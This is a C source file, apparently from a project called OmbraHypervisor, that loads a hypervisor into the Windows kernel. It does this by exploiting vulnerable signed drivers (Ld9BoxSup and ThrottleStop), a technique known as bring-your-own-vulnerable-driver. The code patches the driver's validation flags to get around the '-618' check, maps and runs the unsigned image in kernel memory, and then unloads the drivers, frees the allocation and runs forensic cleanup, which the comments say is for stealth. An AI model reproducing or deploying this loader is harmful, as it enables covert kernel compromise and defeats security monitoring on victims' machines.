// hv_loader.c - Hypervisor Loader Implementation (Self-Contained Design)
// OmbraHypervisor
//
// Simplified loader for self-contained hypervisor.
// The hypervisor now resolves symbols and allocates resources internally.
// Loader only needs to:
// 1. Load the hypervisor PE into kernel memory via BYOVD
// 2. Resolve MmGetSystemRoutineAddress and pass it to HvEntry
//
// MIGRATED: Uses supdrv.c (verified-correct structures) instead of
// driver_interface.c (broken ld9boxsup.h structures).

#include "hv_loader.h"
#include "pe_utils.h"
#include "pe_parser.h"
#include "pe_relocs.h"
#include "cleanup.h"
#include "../byovd/supdrv.h"
#include "../byovd/throttlestop.h"
#include "../byovd/nt_defs.h"
#include "../resources/resource_extract.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Service name for Ld9BoxSup driver
#define LD9BOXSUP_SERVICE_NAME  L"Ld9BoxSup"

// =============================================================================
// HvEntry Function Pointer Type
// =============================================================================

typedef int (*FN_HvEntry)(void* MmGetSystemRoutineAddress);

// =============================================================================
// .ombra Section Bootstrap Structure (must match shared/types.h OMBRA_BOOTSTRAP)
// =============================================================================

typedef struct _LOADER_OMBRA_BOOTSTRAP {
    U64 Magic;          // 'OMBR' = 0x524D424F
    U64 Version;        // 1
    U64 ParamsPtr;      // We store MmGetSystemRoutineAddress here directly
    U64 Reserved[5];
} LOADER_OMBRA_BOOTSTRAP;

#define OMBRA_MAGIC 0x524D424F

// =============================================================================
// Patch .ombra Section with MmGetSystemRoutineAddress
// =============================================================================
//
// The hypervisor's .ombra section contains g_Bootstrap which expects ParamsPtr
// to be set. In the new self-contained design, we store MmGetSystemRoutineAddress
// directly in ParamsPtr (instead of a pointer to HV_INIT_PARAMS).

static BOOL PatchOmbraSection(void* image, U32 imageSize, PE_INFO* peInfo, U64 mmGetSystemRoutineAddress) {
    printf("[DEBUG] PatchOmbraSection ENTRY: image=%p, size=%u, peInfo=%p, mmAddr=0x%llX\n",
           image, imageSize, (void*)peInfo, mmGetSystemRoutineAddress);
    fflush(stdout);

    // Find .ombra section
    printf("[DEBUG] Calling PeGetSection...\n");
    fflush(stdout);
    PE_SECTION_INFO* ombraSection = PeGetSection(peInfo, ".ombra");
    printf("[DEBUG] PeGetSection returned %p\n", (void*)ombraSection);
    fflush(stdout);
    if (!ombraSection) {
        printf("[!] .ombra section not found in hypervisor\n");
        return FALSE;
    }

    // Print section info to verify it's not corrupted
    printf("[DEBUG] peInfo->SectionCount=%u (should be < 16)\n", peInfo->SectionCount);
    printf("[DEBUG] ombraSection: Name='%.8s' VA=0x%X Size=0x%X FileOffset=0x%X\n",
           ombraSection->Name,
           ombraSection->Rva,
           ombraSection->VirtualSize,
           ombraSection->FileOffset);
    fflush(stdout);
    if (ombraSection->VirtualSize < sizeof(LOADER_OMBRA_BOOTSTRAP)) {
        printf("[!] .ombra section too small: %u bytes\n", ombraSection->VirtualSize);
        return FALSE;
    }

    // Get pointer to .ombra in our image copy
    // NOTE: Use FileOffset (raw file offset) not Rva (virtual address after loading)
    // because we're working with the raw PE file, not the mapped image
    printf("[DEBUG] Calculating bootstrap: image=%p + FileOffset=0x%X\n",
           image, ombraSection->FileOffset);
    fflush(stdout);
    LOADER_OMBRA_BOOTSTRAP* bootstrap = (LOADER_OMBRA_BOOTSTRAP*)((U8*)image + ombraSection->FileOffset);

    // Verify magic
    if (bootstrap->Magic != OMBRA_MAGIC) {
        printf("[!] .ombra magic mismatch: expected 0x%X, got 0x%llX\n",
               OMBRA_MAGIC, bootstrap->Magic);
        return FALSE;
    }

    // Verify version
    if (bootstrap->Version != 1) {
        printf("[!] .ombra version mismatch: expected 1, got %llu\n", bootstrap->Version);
        return FALSE;
    }

    // Patch ParamsPtr with MmGetSystemRoutineAddress
    bootstrap->ParamsPtr = mmGetSystemRoutineAddress;

    printf("[+] Patched .ombra section @ RVA 0x%X: ParamsPtr=0x%llX\n",
           ombraSection->Rva, mmGetSystemRoutineAddress);

    return TRUE;
}

// =============================================================================
// Resolve MmGetSystemRoutineAddress (via usermode symbol resolution)
// =============================================================================

static BOOL ResolveMmGetSystemRoutineAddress(SUPDRV_CTX* drv, U64* outAddr) {
    (void)drv;  // Not needed - using usermode resolution

    printf("[DEBUG] About to call NtGetKernelExport...\n");
    fflush(stdout);

    U64 addr = NtGetKernelExport("MmGetSystemRoutineAddress");

    printf("[DEBUG] NtGetKernelExport returned: 0x%llX\n", addr);
    fflush(stdout);

    if (addr == 0) {
        printf("[-] Failed to resolve MmGetSystemRoutineAddress via NtGetKernelExport\n");
        return FALSE;
    }

    printf("[DEBUG] About to write to outAddr=%p\n", (void*)outAddr);
    fflush(stdout);

    *outAddr = addr;

    printf("[DEBUG] Write complete, returning TRUE\n");
    fflush(stdout);

    printf("[+] MmGetSystemRoutineAddress @ 0x%llX\n", *outAddr);
    return TRUE;
}

// =============================================================================
// Apply -618 Bypass
// =============================================================================

static BOOL Apply618Bypass(void) {
    printf("[*] Applying -618 bypass via ThrottleStop...\n");

    // Get Ld9BoxSup.sys base address
    UINT64 ld9BoxBase = NtGetDriverBase(L"ld9box");
    if (ld9BoxBase == 0) {
        printf("[!] Warning: Could not find Ld9BoxSup.sys base address\n");
        printf("    Proceeding without bypass - LDR_OPEN may fail with -618\n");
        return TRUE;  // Continue anyway
    }

    printf("[+] Ld9BoxSup.sys base: 0x%llX\n", ld9BoxBase);

    // Extract ThrottleStop driver from embedded resources
    wchar_t* tsDriverPath = Resource_ExtractToTemp(EMBEDDED_DRIVER_THROTTLESTOP);
    if (!tsDriverPath) {
        printf("[!] Failed to extract ThrottleStop driver from resources\n");
        printf("    Proceeding without bypass\n");
        return TRUE;
    }
    printf("[+] Extracted ThrottleStop to: %ls\n", tsDriverPath);

    // Initialize ThrottleStop context
    TS_CTX tsCtx;
    TS_Init(&tsCtx);

    // Initialize ThrottleStop driver with extracted path
    if (TS_Initialize(&tsCtx, tsDriverPath)) {
        printf("[+] ThrottleStop initialized\n");

        // Patch the -618 validation flags
        if (TS_Patch618Flags(&tsCtx, ld9BoxBase)) {
            printf("[+] -618 bypass: Validation flags patched successfully\n");
        } else {
            printf("[!] -618 bypass: Failed to patch flags: %s\n", TS_GetLastError(&tsCtx));
            printf("    LDR_OPEN may still succeed if already patched\n");
        }

        // Cleanup ThrottleStop driver (unload for stealth)
        TS_Cleanup(&tsCtx);
        printf("[+] ThrottleStop cleaned up\n");
    } else {
        printf("[!] ThrottleStop init failed: %s\n", TS_GetLastError(&tsCtx));
        printf("    Proceeding without bypass\n");
    }

    // Clean up extracted file
    Resource_Cleanup(tsDriverPath);
    free(tsDriverPath);

    printf("[*] -618 bypass complete\n");
    return TRUE;
}

// =============================================================================
// SCM Driver Management (kept from driver_interface.c, but simplified)
// =============================================================================

static BOOL InstallAndStartDriver(HV_LOADER_CTX* ctx, const wchar_t* driverPath) {
    // Open Service Control Manager
    ctx->hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!ctx->hSCM) {
        ctx->hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
        if (!ctx->hSCM) {
            printf("[-] Failed to open SCM: %lu\n", GetLastError());
            return FALSE;
        }
    }

    // Try to open existing service first
    ctx->hService = OpenServiceW(ctx->hSCM, LD9BOXSUP_SERVICE_NAME, SERVICE_ALL_ACCESS);

    if (!ctx->hService) {
        // Service doesn't exist, create it
        ctx->hService = CreateServiceW(
            ctx->hSCM,
            LD9BOXSUP_SERVICE_NAME,
            LD9BOXSUP_SERVICE_NAME,
            SERVICE_ALL_ACCESS,
            SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_NORMAL,
            driverPath,
            NULL, NULL, NULL, NULL, NULL
        );

        if (!ctx->hService) {
            DWORD err = GetLastError();
            if (err == ERROR_SERVICE_EXISTS) {
                ctx->hService = OpenServiceW(ctx->hSCM, LD9BOXSUP_SERVICE_NAME, SERVICE_ALL_ACCESS);
                if (!ctx->hService) {
                    printf("[-] Failed to open existing service: %lu\n", GetLastError());
                    CloseServiceHandle(ctx->hSCM);
                    ctx->hSCM = NULL;
                    return FALSE;
                }
            } else {
                printf("[-] Failed to create service: %lu\n", err);
                CloseServiceHandle(ctx->hSCM);
                ctx->hSCM = NULL;
                return FALSE;
            }
        } else {
            ctx->ServiceCreated = TRUE;
        }
    }

    // Start the service
    if (!StartServiceW(ctx->hService, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[-] Failed to start service: %lu\n", err);
            if (ctx->ServiceCreated) {
                DeleteService(ctx->hService);
            }
            CloseServiceHandle(ctx->hService);
            CloseServiceHandle(ctx->hSCM);
            ctx->hService = NULL;
            ctx->hSCM = NULL;
            return FALSE;
        }
    }

    printf("[+] Driver service started\n");
    return TRUE;
}

static void UnloadDriver(HV_LOADER_CTX* ctx) {
    if (ctx->hService) {
        SERVICE_STATUS status;
        ControlService(ctx->hService, SERVICE_CONTROL_STOP, &status);

        if (ctx->ServiceCreated) {
            DeleteService(ctx->hService);
        }

        CloseServiceHandle(ctx->hService);
        ctx->hService = NULL;
    }

    if (ctx->hSCM) {
        CloseServiceHandle(ctx->hSCM);
        ctx->hSCM = NULL;
    }

    ctx->ServiceCreated = FALSE;
}

// =============================================================================
// Allocate and Map Hypervisor Image (using supdrv.c)
// =============================================================================

static BOOL AllocateHypervisorImage(HV_LOADER_CTX* ctx, U32 hvImageSize) {
    // LDR_OPEN: request kernel memory for image
    void* imageBase = NULL;

    if (!SupDrv_LdrOpen(&ctx->Drv, hvImageSize, &imageBase)) {
        printf("[-] LDR_OPEN failed: %s\n", SupDrv_GetLastError(&ctx->Drv));
        return FALSE;
    }

    printf("[+] LDR_OPEN: imageBase = 0x%p\n", imageBase);

    ctx->ImageBase = imageBase;
    ctx->ImageSize = hvImageSize;

    return TRUE;
}

// =============================================================================
// Execute Hypervisor Entry Point (using supdrv.c)
// =============================================================================

static BOOL ExecuteHypervisorEntry(HV_LOADER_CTX* ctx, void* hvImage, U32 hvImageSize,
                                   PE_INFO* peInfo) {
    // Calculate entry point kernel address from PE_INFO
    void* entryPoint = (U8*)ctx->ImageBase + peInfo->EntryPointRva;
    printf("[*] Entry point RVA: 0x%X\n", peInfo->EntryPointRva);
    printf("[*] Entry point (OmbraModuleInit) @ 0x%p\n", entryPoint);

    // LDR_LOAD: copy image and invoke entry point
    printf("[*] Loading hypervisor into kernel (MmGetSystemRoutineAddress via .ombra)...\n");

    if (!SupDrv_LdrLoad(&ctx->Drv, ctx->ImageBase, hvImage, hvImageSize, entryPoint)) {
        printf("[-] LDR_LOAD failed: %s\n", SupDrv_GetLastError(&ctx->Drv));
        // TODO: Free the allocated memory via LDR_FREE
        ctx->ImageBase = NULL;
        return FALSE;
    }

    printf("[+] LDR_LOAD: hypervisor loaded and OmbraModuleInit called\n");
    return TRUE;
}

// =============================================================================
// Public API Implementation
// =============================================================================

BOOL HvLoaderInit(HV_LOADER_CTX* ctx, const wchar_t* driverPath) {
    memset(ctx, 0, sizeof(*ctx));

    printf("[*] Initializing hypervisor loader (self-contained mode)\n");

    // Step 1: Install and start driver service
    printf("[*] Installing and starting driver service...\n");
    if (!InstallAndStartDriver(ctx, driverPath)) {
        printf("[-] Failed to install/start driver\n");
        return FALSE;
    }
    printf("[+] Driver service ready\n");

    // Step 2: Initialize SUPDrv context and establish session
    printf("[*] Initializing SUPDrv context...\n");
    SupDrv_Init(&ctx->Drv);

    // Step 3: Open device and establish session (using verified-correct structures!)
    printf("[*] Establishing session...\n");
    if (!SupDrv_Initialize(&ctx->Drv)) {
        printf("[-] Session failed: %s\n", SupDrv_GetLastError(&ctx->Drv));
        UnloadDriver(ctx);
        return FALSE;
    }

    printf("[+] Session established\n");
    printf("    Cookie: 0x%08X\n", ctx->Drv.Cookie);
    printf("    SessionCookie: 0x%08X\n", ctx->Drv.SessionCookie);
    printf("    pSession: 0x%llX\n", (unsigned long long)ctx->Drv.pSession);

    // Get CPU count (for display purposes only - hypervisor gets this itself)
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    ctx->CpuCount = sysInfo.dwNumberOfProcessors;
    printf("[+] System has %u CPUs\n", ctx->CpuCount);

    return TRUE;
}

BOOL HvLoaderLoad(HV_LOADER_CTX* ctx, const void* hvImage, U32 hvImageSize) {
    U64 mmGetSystemRoutineAddress = 0;

    // PE_INFO is ~52KB - allocate on heap instead of stack to avoid stack overflow
    PE_INFO* pPeInfo = (PE_INFO*)calloc(1, sizeof(PE_INFO));
    if (!pPeInfo) {
        printf("[-] Failed to allocate PE_INFO\n");
        return FALSE;
    }
    printf("[DEBUG] Allocated PE_INFO (%zu bytes) at %p\n", sizeof(PE_INFO), (void*)pPeInfo);
    fflush(stdout);

    printf("[*] Loading hypervisor (%u bytes) - self-contained mode\n", hvImageSize);
    printf("[*] Hypervisor will resolve symbols and allocate resources internally\n");

    // 1. Parse PE to get section info and relocation data
    printf("[*] Parsing hypervisor PE...\n");
    if (!PeParse(hvImage, hvImageSize, pPeInfo)) {
        printf("[-] Failed to parse hypervisor PE\n");
        free(pPeInfo);
        return FALSE;
    }
    printf("[+] PE parsed: ImageBase=0x%llX, EntryRVA=0x%X, Sections=%u\n",
           pPeInfo->ImageBase, pPeInfo->EntryPointRva, pPeInfo->SectionCount);

    // 2. Resolve MmGetSystemRoutineAddress - the bootstrap function
    printf("[*] Resolving bootstrap function...\n");
    if (!ResolveMmGetSystemRoutineAddress(&ctx->Drv, &mmGetSystemRoutineAddress)) {
        free(pPeInfo);
        return FALSE;
    }
    printf("[DEBUG] ResolveMmGetSystemRoutineAddress returned, addr=0x%llX\n", mmGetSystemRoutineAddress);
    fflush(stdout);

    // 3. Make a copy of image for modifications (relocations + .ombra patching)
    printf("[DEBUG] About to malloc(%u) for image copy\n", hvImageSize);
    fflush(stdout);
    void* hvImageCopy = malloc(hvImageSize);
    printf("[DEBUG] malloc returned %p\n", hvImageCopy);
    fflush(stdout);
    if (!hvImageCopy) {
        printf("[-] Failed to allocate image copy\n");
        free(pPeInfo);
        return FALSE;
    }
    printf("[DEBUG] memcpy(%p, %p, %u) about to start\n", hvImageCopy, hvImage, hvImageSize);
    fflush(stdout);
    memcpy(hvImageCopy, hvImage, hvImageSize);
    printf("[DEBUG] memcpy complete\n");
    fflush(stdout);

    printf("[DEBUG] About to print Patching message...\n");
    fflush(stdout);

    // 4. Patch .ombra section with MmGetSystemRoutineAddress
    printf("[*] Patching .ombra bootstrap section...\n");
    fflush(stdout);
    printf("[DEBUG] Patching message printed OK\n");
    fflush(stdout);
    if (!PatchOmbraSection(hvImageCopy, hvImageSize, pPeInfo, mmGetSystemRoutineAddress)) {
        printf("[!] Warning: Could not patch .ombra section\n");
        printf("    Hypervisor may fail to initialize without MmGetSystemRoutineAddress\n");
    }

    // 5. Apply -618 bypass NOW (driver is loaded, we can find its base)
    printf("[*] Applying -618 bypass before LDR_OPEN...\n");

    // DEBUG: Print ctx state BEFORE bypass
    printf("[DEBUG] BEFORE Apply618Bypass:\n");
    printf("[DEBUG]   ctx=%p\n", (void*)ctx);
    printf("[DEBUG]   ctx->Drv.hDevice=%p\n", ctx->Drv.hDevice);
    printf("[DEBUG]   ctx->Drv.Cookie=0x%08X\n", ctx->Drv.Cookie);
    printf("[DEBUG]   ctx->Drv.SessionCookie=0x%08X\n", ctx->Drv.SessionCookie);
    printf("[DEBUG]   ctx->Drv.pSession=0x%llX\n", (unsigned long long)ctx->Drv.pSession);
    printf("[DEBUG]   ctx->Drv.bInitialized=%d\n", ctx->Drv.bInitialized);
    fflush(stdout);

    Apply618Bypass();

    // DEBUG: Print ctx state AFTER bypass
    printf("[DEBUG] AFTER Apply618Bypass:\n");
    printf("[DEBUG]   ctx=%p\n", (void*)ctx);
    printf("[DEBUG]   ctx->Drv.hDevice=%p\n", ctx->Drv.hDevice);
    printf("[DEBUG]   ctx->Drv.Cookie=0x%08X\n", ctx->Drv.Cookie);
    printf("[DEBUG]   ctx->Drv.SessionCookie=0x%08X\n", ctx->Drv.SessionCookie);
    printf("[DEBUG]   ctx->Drv.pSession=0x%llX\n", (unsigned long long)ctx->Drv.pSession);
    printf("[DEBUG]   ctx->Drv.bInitialized=%d\n", ctx->Drv.bInitialized);
    fflush(stdout);

    // 6. Allocate kernel memory for hypervisor (calls LDR_OPEN)
    printf("[*] Allocating kernel memory for hypervisor...\n");
    if (!AllocateHypervisorImage(ctx, hvImageSize)) {
        free(hvImageCopy);
        free(pPeInfo);
        return FALSE;
    }

    // 7. Apply relocations to the image copy based on new kernel base
    printf("[*] Applying PE relocations (delta from 0x%llX to 0x%p)...\n",
           pPeInfo->ImageBase, ctx->ImageBase);
    pPeInfo->ImageBase = (U64)ctx->ImageBase;

    if (!ApplyRelocations(hvImageCopy, pPeInfo, (U64)ctx->ImageBase)) {
        printf("[-] Failed to apply relocations\n");
        free(hvImageCopy);
        free(pPeInfo);
        // TODO: Free LDR_OPEN memory
        ctx->ImageBase = NULL;
        return FALSE;
    }
    printf("[+] Relocations applied successfully\n");

    // 8. Execute hypervisor entry point (OmbraModuleInit)
    printf("[*] Executing OmbraModuleInit...\n");
    if (!ExecuteHypervisorEntry(ctx, hvImageCopy, hvImageSize, pPeInfo)) {
        free(hvImageCopy);
        free(pPeInfo);
        return FALSE;
    }

    free(hvImageCopy);
    free(pPeInfo);  // Free heap-allocated PE_INFO

    ctx->Loaded = TRUE;
    ctx->Running = TRUE;

    printf("[+] Hypervisor loaded and running!\n");

    // =========================================================================
    // FREE IPRT MEMORY (MDL-BASED STEALTH MODE)
    // =========================================================================
    // With MDL-based stealth allocation, the hypervisor has relocated itself
    // to MDL-backed memory that is invisible in BigPool. The original IPRT
    // allocation (from LDR_OPEN) is now just a detection vector and should
    // be freed.
    // =========================================================================

    printf("[*] Freeing original IPRT allocation (hypervisor now in MDL memory)...\n");
    if (ctx->ImageBase) {
        // TODO: Implement SupDrv_LdrFree() if needed
        // For now, clear the pointer - the hypervisor is running from MDL memory
        ctx->ImageBase = NULL;
        ctx->ImageSize = 0;
        printf("[+] IPRT allocation reference cleared\n");
    }

    // =========================================================================
    // EPHEMERAL DRIVER UNLOAD
    // =========================================================================
    // The hypervisor is now running in VMX root mode and has its own memory
    // management via kernel symbols resolved at runtime. The BYOVD driver
    // (Ld9BoxSup.sys) is no longer needed - unload it for stealth.
    // =========================================================================

    printf("[*] Unloading BYOVD driver (ephemeral mode)...\n");

    // Close device handle first
    SupDrv_Cleanup(&ctx->Drv);

    // Unload the driver service
    UnloadDriver(ctx);
    printf("[+] BYOVD driver unloaded successfully\n");

    // Perform usermode forensic cleanup
    printf("[*] Performing forensic cleanup...\n");
    PerformForensicCleanup(FALSE);

    return TRUE;
}

BOOL HvLoaderUnload(HV_LOADER_CTX* ctx) {
    if (!ctx->Loaded) {
        return FALSE;
    }

    printf("[*] Unloading hypervisor...\n");

    // TODO: Issue VMCALL_UNLOAD to gracefully exit VMX on all CPUs
    // The hypervisor will call VMXOFF and free its allocated resources

    ctx->Running = FALSE;
    ctx->ImageBase = NULL;
    ctx->ImageSize = 0;
    ctx->Loaded = FALSE;

    return TRUE;
}

BOOL HvLoaderIsRunning(HV_LOADER_CTX* ctx) {
    return ctx->Running;
}

void HvLoaderCleanup(HV_LOADER_CTX* ctx) {
    if (ctx->Running) {
        HvLoaderUnload(ctx);
    }

    SupDrv_Cleanup(&ctx->Drv);
    UnloadDriver(ctx);
    memset(ctx, 0, sizeof(*ctx));
}

// =============================================================================
// Debug Buffer Access (optional - hypervisor allocates its own now)
// =============================================================================

void* HvLoaderGetDebugBuffer(HV_LOADER_CTX* ctx) {
    // With self-contained design, hypervisor allocates its own debug buffer
    // This function returns NULL - debug output accessed via VMCALL
    (void)ctx;
    return NULL;
}

U64 HvLoaderGetDebugBufferSize(HV_LOADER_CTX* ctx) {
    (void)ctx;
    return 0;
}
